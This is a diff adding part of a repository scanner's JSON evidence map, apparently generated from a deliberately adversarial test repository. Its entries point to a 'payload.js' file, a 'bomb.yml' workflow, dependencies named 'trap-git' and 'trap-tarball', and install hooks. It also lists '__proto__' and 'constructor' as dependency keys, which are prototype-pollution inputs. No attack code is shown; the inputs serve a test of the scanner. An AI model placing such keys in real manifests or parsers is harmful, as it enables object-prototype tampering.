+      "id": "ev_1c7b00099de69a359d3c4739",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/dependencies/trap-git"
+      },
+      "object_id": "1ec517ff2f7733f165b0f9b76a7222d108f6370c",
+      "path": "package.json",
+      "rule": "manifest.dependencies"
+    },
+    "ev_20447843626860d971d6b488": {
+      "commit": null,
+      "content_digest": "34e6c17ed4805c0846b81e81e84f1e55b483beb3d1598856102433a410dfbae0",
+      "detector": "package-relations",
+      "excerpt_digest": "f5abb50710e274f5239ada97903b13013577bf9101810cbd3efe4afc626dc464",
+      "id": "ev_20447843626860d971d6b488",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/dependencies/trap-git"
+      },
+      "object_id": "1ec517ff2f7733f165b0f9b76a7222d108f6370c",
+      "path": "package.json",
+      "rule": "packages.consumed"
+    },
+    "ev_2293a793ed373b201fbf4fe6": {
+      "commit": null,
+      "content_digest": "34e6c17ed4805c0846b81e81e84f1e55b483beb3d1598856102433a410dfbae0",
+      "detector": "package-relations",
+      "excerpt_digest": "e67688b317883bb6eb9157728fbdff0ea3daf8ada2378feb785f2c825a00da94",
+      "id": "ev_2293a793ed373b201fbf4fe6",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/name"
+      },
+      "object_id": "1ec517ff2f7733f165b0f9b76a7222d108f6370c",
+      "path": "package.json",
+      "rule": "packages.produced"
+    },
+    "ev_2aa41e230f18b6b3647e6e17": {
+      "commit": null,
+      "content_digest": "c53344e00458f2f67b0ae21e79a5557657e393ca5f6655da160ca3665ece8bf1",
+      "detector": "ci",
+      "excerpt_digest": "71258099330e4fa96edd66b2639e9af7ac749dc81d31ac4099315dbd56be6321",
+      "id": "ev_2aa41e230f18b6b3647e6e17",
+      "location": {
+        "format": "yaml",
+        "kind": "pointer",
+        "pointer": "/jobs/build/steps/2/run"
+      },
+      "object_id": "5f8da3a3a9c8e3fdd76cd1e27b1bbe90a0242d0b",
+      "path": ".github/workflows/ci.yml",
+      "rule": "ci.github-actions.run"
+    },
+    "ev_2ae679b289e4b183a3208b96": {
+      "commit": null,
+      "content_digest": "f109013b0f83e23db4ec3a1f6bb07bb4908669e843adeb04b0738ca6c7a6486b",
+      "detector": "package-metadata",
+      "excerpt_digest": "48714a72a05f321986cdd4bbbd4a1d9420dc9fffd70999fbdb930dc458e4167e",
+      "id": "ev_2ae679b289e4b183a3208b96",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/scripts/postinstall"
+      },
+      "object_id": "2d5c76a68983f5d34bead14e6e1df8e5752873c5",
+      "path": "packages/plugin/package.json",
+      "rule": "manifest.scripts"
+    },
+    "ev_2b009c03811715c205bc7d11": {
+      "commit": null,
+      "content_digest": "34e6c17ed4805c0846b81e81e84f1e55b483beb3d1598856102433a410dfbae0",
+      "detector": "package-metadata",
+      "excerpt_digest": "3f016c87cecbc86b4e7a60bc47e5da8f667cc48707346a5fc82bb3c7884fed66",
+      "id": "ev_2b009c03811715c205bc7d11",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/scripts/test"
+      },
+      "object_id": "1ec517ff2f7733f165b0f9b76a7222d108f6370c",
+      "path": "package.json",
+      "rule": "manifest.scripts"
+    },
+    "ev_315737c71193bcb84f883fe8": {
+      "commit": null,
+      "content_digest": "34e6c17ed4805c0846b81e81e84f1e55b483beb3d1598856102433a410dfbae0",
+      "detector": "package-metadata",
+      "excerpt_digest": "99c451e8ce9769e37432246dd7b21e71d7be55af8c1e797213f1ffe2f7cfd917",
+      "id": "ev_315737c71193bcb84f883fe8",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/devDependencies/webpack"
+      },
+      "object_id": "1ec517ff2f7733f165b0f9b76a7222d108f6370c",
+      "path": "package.json",
+      "rule": "manifest.dependencies"
+    },
+    "ev_36664c514ec2654c8e949df5": {
+      "commit": null,
+      "content_digest": "cebdc73d2fe995b2f968e1ffd754875dfa15ff9f14a3a63215171080e5796843",
+      "detector": "service-dependencies",
+      "excerpt_digest": "84485b60d9c0e4e9e844b5eccbf2b715208d9bd3b390d37a42f6a3b4774bb8ed",
+      "id": "ev_36664c514ec2654c8e949df5",
+      "location": {
+        "end": 2,
+        "kind": "lines",
+        "start": 2
+      },
+      "object_id": "cd64d77ada0254a79caf3c82ef1490ae6062f679",
+      "path": "src/payload.js",
+      "rule": "services.fetch"
+    },
+    "ev_37c598843157fe7e705b1b71": {
+      "commit": null,
+      "content_digest": "34e6c17ed4805c0846b81e81e84f1e55b483beb3d1598856102433a410dfbae0",
+      "detector": "ci",
+      "excerpt_digest": "3f016c87cecbc86b4e7a60bc47e5da8f667cc48707346a5fc82bb3c7884fed66",
+      "id": "ev_37c598843157fe7e705b1b71",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/scripts/test"
+      },
+      "object_id": "1ec517ff2f7733f165b0f9b76a7222d108f6370c",
+      "path": "package.json",
+      "rule": "manifest.verification-script"
+    },
+    "ev_37f62c0a5854fbe4bfce98cb": {
+      "commit": null,
+      "content_digest": "34e6c17ed4805c0846b81e81e84f1e55b483beb3d1598856102433a410dfbae0",
+      "detector": "package-metadata",
+      "excerpt_digest": "5c3004007616177e41f7403e26f392adc4bbd44f7aa26aaa7a7e3df14833c9a4",
+      "id": "ev_37f62c0a5854fbe4bfce98cb",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/scripts/install"
+      },
+      "object_id": "1ec517ff2f7733f165b0f9b76a7222d108f6370c",
+      "path": "package.json",
+      "rule": "manifest.scripts"
+    },
+    "ev_3b1edcd83986d08bac7bd9d1": {
+      "commit": null,
+      "content_digest": "4e081992af0a712db31607acab423c32bfdaf568ad7814a3f7d0dedcbfdcda92",
+      "detector": "inventory",
+      "excerpt_digest": "4e081992af0a712db31607acab423c32bfdaf568ad7814a3f7d0dedcbfdcda92",
+      "id": "ev_3b1edcd83986d08bac7bd9d1",
+      "location": {
+        "kind": "entry"
+      },
+      "object_id": "a24bd36cc6f88249fa361256ada952d5e3404f02",
+      "path": "jest.config.mjs",
+      "rule": "inventory.language-by-extension"
+    },
+    "ev_4052b8c25217782314037549": {
+      "commit": null,
+      "content_digest": "3887dd223e4cb4415fa5efee36cf84cee3dfacbcd6f5d3a66ea672845e3ac656",
+      "detector": "tooling",
+      "excerpt_digest": "3887dd223e4cb4415fa5efee36cf84cee3dfacbcd6f5d3a66ea672845e3ac656",
+      "id": "ev_4052b8c25217782314037549",
+      "location": {
+        "kind": "entry"
+      },
+      "object_id": "a82c6f4cafdf040574ea4aaea5b9061b74ca2f6c",
+      "path": "package-lock.json",
+      "rule": "lockfile.package-manager"
+    },
+    "ev_411b0a34b16a0aed3d925e52": {
+      "commit": null,
+      "content_digest": "34e6c17ed4805c0846b81e81e84f1e55b483beb3d1598856102433a410dfbae0",
+      "detector": "package-relations",
+      "excerpt_digest": "924687e02818c67b11bc84a752290a5db8c36ad4aaf4f193eb0d6a6b1cb087fe",
+      "id": "ev_411b0a34b16a0aed3d925e52",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/devDependencies/vite"
+      },
+      "object_id": "1ec517ff2f7733f165b0f9b76a7222d108f6370c",
+      "path": "package.json",
+      "rule": "packages.consumed"
+    },
+    "ev_4b874e24cb4994a1bfd6d1fc": {
+      "commit": null,
+      "content_digest": "34e6c17ed4805c0846b81e81e84f1e55b483beb3d1598856102433a410dfbae0",
+      "detector": "package-metadata",
+      "excerpt_digest": "5ae5d712b282b086cdcb89871b86cf8870bd2f00cedb9a7e96a3dd738b6fc9e1",
+      "id": "ev_4b874e24cb4994a1bfd6d1fc",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/scripts/preinstall"
+      },
+      "object_id": "1ec517ff2f7733f165b0f9b76a7222d108f6370c",
+      "path": "package.json",
+      "rule": "manifest.scripts"
+    },
+    "ev_4fba920d55c000c258616670": {
+      "commit": null,
+      "content_digest": "31f784a5a2733d7e49d0e3aaf760a897a9f16bf2d12e283711928362ac9e2dbd",
+      "detector": "inventory",
+      "excerpt_digest": "31f784a5a2733d7e49d0e3aaf760a897a9f16bf2d12e283711928362ac9e2dbd",
+      "id": "ev_4fba920d55c000c258616670",
+      "location": {
+        "kind": "entry"
+      },
+      "object_id": "271e5cd1d935cacab2a0c8562fbc4bd1627049cb",
+      "path": "src/deep.ts",
+      "rule": "inventory.language-by-extension"
+    },
+    "ev_5238045a09d9b510f4b72a54": {
+      "commit": null,
+      "content_digest": "b002529bf56988d657626ed1af6cdc6bdc5951db665d4d5f1843642e54b5a217",
+      "detector": "tooling",
+      "excerpt_digest": "b002529bf56988d657626ed1af6cdc6bdc5951db665d4d5f1843642e54b5a217",
+      "id": "ev_5238045a09d9b510f4b72a54",
+      "location": {
+        "kind": "entry"
+      },
+      "object_id": "6327d3116a3f555b87e9d64378a752f6109e391b",
+      "path": "babel.config.cjs",
+      "rule": "config.tool-file"
+    },
+    "ev_5406d1396a4a28a66498f9ed": {
+      "commit": null,
+      "content_digest": "34e6c17ed4805c0846b81e81e84f1e55b483beb3d1598856102433a410dfbae0",
+      "detector": "package-metadata",
+      "excerpt_digest": "89151e5b939bded2a56308b4eb9203539404a39e7202b4f3fe5f2e6280712e0e",
+      "id": "ev_5406d1396a4a28a66498f9ed",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/workspaces/0"
+      },
+      "object_id": "1ec517ff2f7733f165b0f9b76a7222d108f6370c",
+      "path": "package.json",
+      "rule": "manifest.workspaces"
+    },
+    "ev_55e747b60560bcd13da27f00": {
+      "commit": null,
+      "content_digest": "4e081992af0a712db31607acab423c32bfdaf568ad7814a3f7d0dedcbfdcda92",
+      "detector": "tooling",
+      "excerpt_digest": "4e081992af0a712db31607acab423c32bfdaf568ad7814a3f7d0dedcbfdcda92",
+      "id": "ev_55e747b60560bcd13da27f00",
+      "location": {
+        "kind": "entry"
+      },
+      "object_id": "a24bd36cc6f88249fa361256ada952d5e3404f02",
+      "path": "jest.config.mjs",
+      "rule": "config.tool-file"
+    },
+    "ev_5824518c735cace2f0800a33": {
+      "commit": null,
+      "content_digest": "8b090c1824286b52c0c3ecf489362b139db2d392a90edcd4a97cb21b27963d94",
+      "detector": "inventory",
+      "excerpt_digest": "8b090c1824286b52c0c3ecf489362b139db2d392a90edcd4a97cb21b27963d94",
+      "id": "ev_5824518c735cace2f0800a33",
+      "location": {
+        "kind": "entry"
+      },
+      "object_id": "9e3c7cd7bc857aedcd769b9b0b822a22667f1b3f",
+      "path": ".github/workflows/bomb.yml",
+      "rule": "inventory.language-by-extension"
+    },
+    "ev_593dc0a6479bb283f95451be": {
+      "commit": null,
+      "content_digest": "34e6c17ed4805c0846b81e81e84f1e55b483beb3d1598856102433a410dfbae0",
+      "detector": "package-relations",
+      "excerpt_digest": "39fe4a40977d0585fd5704359e3685b0ada5cf5ee061e5d97385601d120cd0ec",
+      "id": "ev_593dc0a6479bb283f95451be",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/dependencies/constructor"
+      },
+      "object_id": "1ec517ff2f7733f165b0f9b76a7222d108f6370c",
+      "path": "package.json",
+      "rule": "packages.consumed"
+    },
+    "ev_5bfa2f9295bfd83fb3093680": {
+      "commit": null,
+      "content_digest": "34e6c17ed4805c0846b81e81e84f1e55b483beb3d1598856102433a410dfbae0",
+      "detector": "package-metadata",
+      "excerpt_digest": "be1e859219eaf2c21d8f3f2149aca811aac06084d63254fa066d6e38c23ebe6a",
+      "id": "ev_5bfa2f9295bfd83fb3093680",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/scripts/postinstall"
+      },
+      "object_id": "1ec517ff2f7733f165b0f9b76a7222d108f6370c",
+      "path": "package.json",
+      "rule": "manifest.scripts"
+    },
+    "ev_62d4c89f6cff3fd1129bd660": {
+      "commit": null,
+      "content_digest": "f6258f1ce69506a136d3037e8c5be4134cbd2c59da3320e6fc83a4b4db91c209",
+      "detector": "inventory",
+      "excerpt_digest": "f6258f1ce69506a136d3037e8c5be4134cbd2c59da3320e6fc83a4b4db91c209",
+      "id": "ev_62d4c89f6cff3fd1129bd660",
+      "location": {
+        "kind": "entry"
+      },
+      "object_id": "378cd05ecd3b5013e63d207106f15f7ed489ee95",
+      "path": "src/index.ts",
+      "rule": "inventory.language-by-extension"
+    },
+    "ev_64304a64d9d0e6b90b3a2311": {
+      "commit": null,
+      "content_digest": "34e6c17ed4805c0846b81e81e84f1e55b483beb3d1598856102433a410dfbae0",
+      "detector": "package-metadata",
+      "excerpt_digest": "924687e02818c67b11bc84a752290a5db8c36ad4aaf4f193eb0d6a6b1cb087fe",
+      "id": "ev_64304a64d9d0e6b90b3a2311",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/devDependencies/vite"
+      },
+      "object_id": "1ec517ff2f7733f165b0f9b76a7222d108f6370c",
+      "path": "package.json",
+      "rule": "manifest.dependencies"
+    },
+    "ev_66d9222d5dfa8fbc8f7c1ac1": {
+      "commit": null,
+      "content_digest": "34e6c17ed4805c0846b81e81e84f1e55b483beb3d1598856102433a410dfbae0",
+      "detector": "package-metadata",
+      "excerpt_digest": "39fe4a40977d0585fd5704359e3685b0ada5cf5ee061e5d97385601d120cd0ec",
+      "id": "ev_66d9222d5dfa8fbc8f7c1ac1",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/version"
+      },
+      "object_id": "1ec517ff2f7733f165b0f9b76a7222d108f6370c",
+      "path": "package.json",
+      "rule": "manifest.identity"
+    },
+    "ev_708741572754875d64ccf54b": {
+      "commit": null,
+      "content_digest": "34e6c17ed4805c0846b81e81e84f1e55b483beb3d1598856102433a410dfbae0",
+      "detector": "package-relations",
+      "excerpt_digest": "9f01ff3a672b51bdc93faab1c05e7e1a9c18d3218ea1b125b78d4fcf70615324",
+      "id": "ev_708741572754875d64ccf54b",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/dependencies/trap-tarball"
+      },
+      "object_id": "1ec517ff2f7733f165b0f9b76a7222d108f6370c",
+      "path": "package.json",
+      "rule": "packages.consumed"
+    },
+    "ev_711090ee3ffc82bacdbe5414": {
+      "commit": null,
+      "content_digest": "675404338f3df13a16ac6ef76abfd52310cf50c24f07634bf5cf454b02413c65",
+      "detector": "service-dependencies",
+      "excerpt_digest": "84f557345ac68e19f42684712d8d033fb848ec10aa99861b2c7e223e498a98f3",
+      "id": "ev_711090ee3ffc82bacdbe5414",
+      "location": {
+        "end": 3,
+        "kind": "lines",
+        "start": 3
+      },
+      "object_id": "defa51622cb49c4e11f703dcfccb09df864a5399",
+      "path": "src/api.ts",
+      "rule": "services.fetch"
+    },
+    "ev_71b567dbf77aa5ca9502dfdd": {
+      "commit": null,
+      "content_digest": "fe52af33f5e11819c17de41619b8949f4f428e34e8f51a84a6a8883c4fd20c36",
+      "detector": "inventory",
+      "excerpt_digest": "fe52af33f5e11819c17de41619b8949f4f428e34e8f51a84a6a8883c4fd20c36",
+      "id": "ev_71b567dbf77aa5ca9502dfdd",
+      "location": {
+        "kind": "entry"
+      },
+      "object_id": "defa51622cb49c4e11f703dcfccb09df864a5399",
+      "path": "src/api.ts",
+      "rule": "inventory.language-by-extension"
+    },
+    "ev_7711620a9f9a6cf86e790d43": {
+      "commit": null,
+      "content_digest": "3887dd223e4cb4415fa5efee36cf84cee3dfacbcd6f5d3a66ea672845e3ac656",
+      "detector": "inventory",
+      "excerpt_digest": "3887dd223e4cb4415fa5efee36cf84cee3dfacbcd6f5d3a66ea672845e3ac656",
+      "id": "ev_7711620a9f9a6cf86e790d43",
+      "location": {
+        "kind": "entry"
+      },
+      "object_id": "a82c6f4cafdf040574ea4aaea5b9061b74ca2f6c",
+      "path": "package-lock.json",
+      "rule": "inventory.language-by-extension"
+    },
+    "ev_7ca2dbfbe527876a82a9c27f": {
+      "commit": null,
+      "content_digest": "c411f7a318da71cf80873b6f8d764c57147775f352f0fe5216b2befb891849ce",
+      "detector": "ci",
+      "excerpt_digest": "c411f7a318da71cf80873b6f8d764c57147775f352f0fe5216b2befb891849ce",
+      "id": "ev_7ca2dbfbe527876a82a9c27f",
+      "location": {
+        "kind": "entry"
+      },
+      "object_id": "5f8da3a3a9c8e3fdd76cd1e27b1bbe90a0242d0b",
+      "path": ".github/workflows/ci.yml",
+      "rule": "ci.definition"
+    },
+    "ev_7d178589e203cceb363dd2ca": {
+      "commit": null,
+      "content_digest": "34e6c17ed4805c0846b81e81e84f1e55b483beb3d1598856102433a410dfbae0",
+      "detector": "tooling",
+      "excerpt_digest": "99c451e8ce9769e37432246dd7b21e71d7be55af8c1e797213f1ffe2f7cfd917",
+      "id": "ev_7d178589e203cceb363dd2ca",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/devDependencies/webpack"
+      },
+      "object_id": "1ec517ff2f7733f165b0f9b76a7222d108f6370c",
+      "path": "package.json",
+      "rule": "manifest.tool-dependency"
+    },
+    "ev_7dbaf3f9b1d48e68de578305": {
+      "commit": null,
+      "content_digest": "aa7af9367c7b0f44294654357ffc546e259dc6e45086a619bcbbd6a6435e7d89",
+      "detector": "inventory",
+      "excerpt_digest": "aa7af9367c7b0f44294654357ffc546e259dc6e45086a619bcbbd6a6435e7d89",
+      "id": "ev_7dbaf3f9b1d48e68de578305",
+      "location": {
+        "kind": "entry"
+      },
+      "object_id": "c6a1f74fa18a2436eb0c519b9ecf2af8f8de4f02",
+      "path": "scripts/postinstall.sh",
+      "rule": "inventory.language-by-extension"
+    },
+    "ev_83fef8ed583ece40ecaf6f73": {
+      "commit": null,
+      "content_digest": "34e6c17ed4805c0846b81e81e84f1e55b483beb3d1598856102433a410dfbae0",
+      "detector": "package-metadata",
+      "excerpt_digest": "4e32cb7da2a6b8cf6f12a85cbe63a13ec03ee45de1e2f3fdcb9881624a69ae2d",
+      "id": "ev_83fef8ed583ece40ecaf6f73",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/scripts/prepare"
+      },
+      "object_id": "1ec517ff2f7733f165b0f9b76a7222d108f6370c",
+      "path": "package.json",
+      "rule": "manifest.scripts"
+    },
+    "ev_87f34706bdaa99202001c574": {
+      "commit": null,
+      "content_digest": "f109013b0f83e23db4ec3a1f6bb07bb4908669e843adeb04b0738ca6c7a6486b",
+      "detector": "package-relations",
+      "excerpt_digest": "88994f64c9983156f7768b1c59d8b36c2dc762c977caafe208b0cf255feeefb7",
+      "id": "ev_87f34706bdaa99202001c574",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/name"
+      },
+      "object_id": "2d5c76a68983f5d34bead14e6e1df8e5752873c5",
+      "path": "packages/plugin/package.json",
+      "rule": "packages.produced"
+    },
+    "ev_8b943fddaf8d6736a3d3889f": {
+      "commit": null,
+      "content_digest": "675404338f3df13a16ac6ef76abfd52310cf50c24f07634bf5cf454b02413c65",
+      "detector": "service-dependencies",
+      "excerpt_digest": "a0e1fac3177f1fceaa1ce4625be98452fe66a49c2de907a24137850d833f775b",
+      "id": "ev_8b943fddaf8d6736a3d3889f",
+      "location": {
+        "end": 4,
+        "kind": "lines",
+        "start": 4
+      },
+      "object_id": "defa51622cb49c4e11f703dcfccb09df864a5399",
+      "path": "src/api.ts",
+      "rule": "services.websocket"
+    },
+    "ev_8cbdc44a19ef5967a5677050": {
+      "commit": null,
+      "content_digest": "c53344e00458f2f67b0ae21e79a5557657e393ca5f6655da160ca3665ece8bf1",
+      "detector": "ci",
+      "excerpt_digest": "d1e60ffbcaa969850d29c367f694dbd6cc97e2421e3a914cecd0804c03b449e5",
+      "id": "ev_8cbdc44a19ef5967a5677050",
+      "location": {
+        "format": "yaml",
+        "kind": "pointer",
+        "pointer": "/jobs/build/steps/1/run"
+      },
+      "object_id": "5f8da3a3a9c8e3fdd76cd1e27b1bbe90a0242d0b",
+      "path": ".github/workflows/ci.yml",
+      "rule": "ci.github-actions.run"
+    },
+    "ev_92010aa9e9fb7e11e1f55225": {
+      "commit": null,
+      "content_digest": "d8d8eeb9a05cb13957036a9496ad6dd96d9a9d1f5a91de0b7b15c790e4657bd9",
+      "detector": "composition",
+      "excerpt_digest": "bab55e6dce66e6dc92837f5858b3a8566cfc87b2ead639888e53e375a7fde703",
+      "id": "ev_92010aa9e9fb7e11e1f55225",
+      "location": {
+        "end": 7,
+        "kind": "lines",
+        "start": 7
+      },
+      "object_id": "2c4daa84fe63f76ae21134bc2c57cb3f38169f1a",
+      "path": "webpack.config.js",
+      "rule": "architecture.module-federation.webpack"
+    },
+    "ev_97b2710e8d2276a400489bff": {
+      "commit": null,
+      "content_digest": "4e7d491e7711ec0c9dff24fa5c26be52aa0fd8a3068ffc67473234e3cc750113",
+      "detector": "runtime-files",
+      "excerpt_digest": "e9770c1753c20565d6ef4a681f40aa1b0b65ab8a8feda75334102ae1c3e45c0e",
+      "id": "ev_97b2710e8d2276a400489bff",
+      "location": {
+        "end": 1,
+        "kind": "lines",
+        "start": 1
+      },
+      "object_id": "d40ce17fb6ec8fe96c637cf4b5cf839d834159f0",
+      "path": "Dockerfile",
+      "rule": "runtime.dockerfile"
+    },
+    "ev_9c90048e5c2098c97920b83a": {
+      "commit": null,
+      "content_digest": "54ef237b27d43a21b723e5d631a851b0c6a06eba3187c8c77143b1e16765be28",
+      "detector": "inventory",
+      "excerpt_digest": "54ef237b27d43a21b723e5d631a851b0c6a06eba3187c8c77143b1e16765be28",
+      "id": "ev_9c90048e5c2098c97920b83a",
+      "location": {
+        "kind": "entry"
+      },
+      "object_id": "ce3c08e0f1a4d78bf551da3c87892b4d5ae179a7",
+      "path": "eslint.config.js",
+      "rule": "inventory.language-by-extension"
+    },
+    "ev_9e54a96fc8dd3d1582d86e67": {
+      "commit": null,
+      "content_digest": "34e6c17ed4805c0846b81e81e84f1e55b483beb3d1598856102433a410dfbae0",
+      "detector": "package-metadata",
+      "excerpt_digest": "39fe4a40977d0585fd5704359e3685b0ada5cf5ee061e5d97385601d120cd0ec",
+      "id": "ev_9e54a96fc8dd3d1582d86e67",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/dependencies/__proto__"
+      },
+      "object_id": "1ec517ff2f7733f165b0f9b76a7222d108f6370c",
+      "path": "package.json",
+      "rule": "manifest.dependencies"
+    },
+    "ev_9e93ef5a94ce024c3438c0ff": {
+      "commit": null,
+      "content_digest": "093b4366eca37f1ece8e47c342d5df6869aecd37354446a5a9d6dea240779050",
+      "detector": "inventory",
+      "excerpt_digest": "093b4366eca37f1ece8e47c342d5df6869aecd37354446a5a9d6dea240779050",
+      "id": "ev_9e93ef5a94ce024c3438c0ff",
+      "location": {
+        "kind": "entry"
+      },
+      "object_id": "1111111111111111111111111111111111111111",
+      "path": "vendor/trap",
+      "rule": "inventory.gitlink"
+    },
+    "ev_a19d915b75bc5e5df633a64e": {
+      "commit": null,
+      "content_digest": "3865762b0c8b83efc1c842c8eb72412b67ad153748b06120f1284b5ab3e3d1c4",
+      "detector": "service-signals",
+      "excerpt_digest": "800d9a33df1530c087fff98b7c7b47a20faa70a94f95a9f57a98bf461d1946dc",
+      "id": "ev_a19d915b75bc5e5df633a64e",
+      "location": {
+        "end": 8,
+        "kind": "lines",
+        "start": 8
+      },
+      "object_id": "8802a0053322f9aa85f12ae94b8a15fe6f29fa4c",
+      "path": "vite.config.ts",
+      "rule": "services.egress.vite-proxy"
+    },
+    "ev_a4427c1cd44e42fcc199d06c": {
+      "commit": null,
+      "content_digest": "2f4d4e68c356e9d546a577ea00ec2eaeb96f6692ad3773870eea7831d0f83947",
+      "detector": "npm-lock",
+      "excerpt_digest": "39fe4a40977d0585fd5704359e3685b0ada5cf5ee061e5d97385601d120cd0ec",
+      "id": "ev_a4427c1cd44e42fcc199d06c",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/packages/node_modules~1__proto__/version"
+      },
+      "object_id": "a82c6f4cafdf040574ea4aaea5b9061b74ca2f6c",
+      "path": "package-lock.json",
+      "rule": "npm-lock.resolved-version"
+    },
+    "ev_a63a9c45f9ab44a0d829f0f9": {
+      "commit": null,
+      "content_digest": "00240c299ffe12f56fd94c3192783e2ed3f3e9bdfe5ea7de7c5c6212e9d1c052",
+      "detector": "inventory",
+      "excerpt_digest": "00240c299ffe12f56fd94c3192783e2ed3f3e9bdfe5ea7de7c5c6212e9d1c052",
+      "id": "ev_a63a9c45f9ab44a0d829f0f9",
+      "location": {
+        "kind": "entry"
+      },
+      "object_id": "75bed2fd66e38c35113faf4a6550e6f9d37e1300",
+      "path": "openapi.yaml",
+      "rule": "inventory.language-by-extension"
+    },
+    "ev_a8db2747a5693a8c433b52d8": {
+      "commit": null,
+      "content_digest": "f109013b0f83e23db4ec3a1f6bb07bb4908669e843adeb04b0738ca6c7a6486b",
+      "detector": "package-metadata",
+      "excerpt_digest": "7ed4f9e88471ae810035b1e57e57df328e7c24840f98915b63c4b345ce5e2e9f",
+      "id": "ev_a8db2747a5693a8c433b52d8",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/version"
+      },
+      "object_id": "2d5c76a68983f5d34bead14e6e1df8e5752873c5",
+      "path": "packages/plugin/package.json",
+      "rule": "manifest.identity"
+    },
+    "ev_aa4c868a9ee39a2c9ed5e0c8": {
+      "commit": null,
+      "content_digest": "b002529bf56988d657626ed1af6cdc6bdc5951db665d4d5f1843642e54b5a217",
+      "detector": "inventory",
+      "excerpt_digest": "b002529bf56988d657626ed1af6cdc6bdc5951db665d4d5f1843642e54b5a217",
+      "id": "ev_aa4c868a9ee39a2c9ed5e0c8",
+      "location": {
+        "kind": "entry"
+      },
+      "object_id": "6327d3116a3f555b87e9d64378a752f6109e391b",
+      "path": "babel.config.cjs",
+      "rule": "inventory.language-by-extension"
+    },
+    "ev_af93b6f81b22b1f303b607b8": {
+      "commit": null,
+      "content_digest": "675404338f3df13a16ac6ef76abfd52310cf50c24f07634bf5cf454b02413c65",
+      "detector": "service-dependencies",
+      "excerpt_digest": "fe88d32df3b86eec95171490750c033aeaff2aa068cca5337a10260121d8dd11",
+      "id": "ev_af93b6f81b22b1f303b607b8",
+      "location": {
+        "end": 5,
+        "kind": "lines",
+        "start": 5
+      },
+      "object_id": "defa51622cb49c4e11f703dcfccb09df864a5399",
+      "path": "src/api.ts",
+      "rule": "services.event-source"
+    },
+    "ev_b5a4bd40150a7294cf4546f2": {
+      "commit": null,
+      "content_digest": "34e6c17ed4805c0846b81e81e84f1e55b483beb3d1598856102433a410dfbae0",
+      "detector": "package-relations",
+      "excerpt_digest": "39fe4a40977d0585fd5704359e3685b0ada5cf5ee061e5d97385601d120cd0ec",
+      "id": "ev_b5a4bd40150a7294cf4546f2",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/dependencies/__proto__"
+      },
+      "object_id": "1ec517ff2f7733f165b0f9b76a7222d108f6370c",
+      "path": "package.json",
+      "rule": "packages.consumed"
+    },
+    "ev_b91fa66f5f6fd86c50d370b4": {
+      "commit": null,
+      "content_digest": "09b08019e2e157dfbc9d342b21f5b9ba7d7d89bc2c8c346e20672c3883e65c5e",
+      "detector": "composition",
+      "excerpt_digest": "504f3f90e64ddd7f7d2f4d4ccb5c68f6286cfd571f2ce8bab136bed5f55cb958",
+      "id": "ev_b91fa66f5f6fd86c50d370b4",
+      "location": {
+        "end": 4,
+        "kind": "lines",
+        "start": 4
+      },
+      "object_id": "455beb60a94c63149126cb266e0dcb5e6f98dbdb",
+      "path": "public/index.html",
+      "rule": "architecture.import-map"
+    },
+    "ev_c0643b45aa1bb35b5aed2a4e": {
+      "commit": null,
+      "content_digest": "34e6c17ed4805c0846b81e81e84f1e55b483beb3d1598856102433a410dfbae0",
+      "detector": "package-metadata",
+      "excerpt_digest": "39fe4a40977d0585fd5704359e3685b0ada5cf5ee061e5d97385601d120cd0ec",
+      "id": "ev_c0643b45aa1bb35b5aed2a4e",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/dependencies/constructor"
+      },
+      "object_id": "1ec517ff2f7733f165b0f9b76a7222d108f6370c",
+      "path": "package.json",
+      "rule": "manifest.dependencies"
+    },
+    "ev_c57852bdb41966a95eddc1a2": {
+      "commit": null,
+      "content_digest": "f109013b0f83e23db4ec3a1f6bb07bb4908669e843adeb04b0738ca6c7a6486b",
+      "detector": "package-metadata",
+      "excerpt_digest": "88994f64c9983156f7768b1c59d8b36c2dc762c977caafe208b0cf255feeefb7",
+      "id": "ev_c57852bdb41966a95eddc1a2",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/name"
+      },
+      "object_id": "2d5c76a68983f5d34bead14e6e1df8e5752873c5",
+      "path": "packages/plugin/package.json",
+      "rule": "manifest.workspaces"
+    },
+    "ev_c70efe72f2ae970c3ffab13f": {
+      "commit": null,
+      "content_digest": "679334bd862707a6630e1b1a240547a6b61d124021b692b0f67544e1413756b5",
+      "detector": "inventory",
+      "excerpt_digest": "679334bd862707a6630e1b1a240547a6b61d124021b692b0f67544e1413756b5",
+      "id": "ev_c70efe72f2ae970c3ffab13f",
+      "location": {
+        "kind": "entry"
+      },
+      "object_id": "455beb60a94c63149126cb266e0dcb5e6f98dbdb",
+      "path": "public/index.html",
+      "rule": "inventory.language-by-extension"
+    },
+    "ev_d0f2f7bfaf9505ffdd8ebe4f": {
+      "commit": null,
+      "content_digest": "c411f7a318da71cf80873b6f8d764c57147775f352f0fe5216b2befb891849ce",
+      "detector": "inventory",
+      "excerpt_digest": "c411f7a318da71cf80873b6f8d764c57147775f352f0fe5216b2befb891849ce",
